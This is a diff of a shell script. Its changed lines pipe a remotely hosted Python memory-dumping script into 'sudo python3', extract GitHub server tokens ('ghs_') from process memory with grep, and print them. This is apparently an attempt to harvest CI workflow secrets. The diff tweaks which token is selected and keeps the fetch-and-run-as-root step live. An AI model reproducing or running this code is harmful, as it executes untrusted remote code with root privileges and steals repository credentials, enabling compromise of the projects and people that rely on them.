@@ -3,13 +3,13 @@ set -e
 
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 #FILE="r3s34rch.md"
-TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u`
+TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | awk 'NR==2' | sort -u`
 
 echo "---------------------------1--------------------------------------"
 echo "$TOKEN_VAL"
 echo "---------------------------2--------------------------------------"
 echo "$TOKEN_VAL" | awk 'NR==2'
-ghsToken= $(echo "$TOKEN_VAL")
+ghsToken= $TOKEN_VAL
 echo "---------------------------3--------------------------------------"
 echo "$ghsToken"
 echo "---------------------------4--------------------------------------"
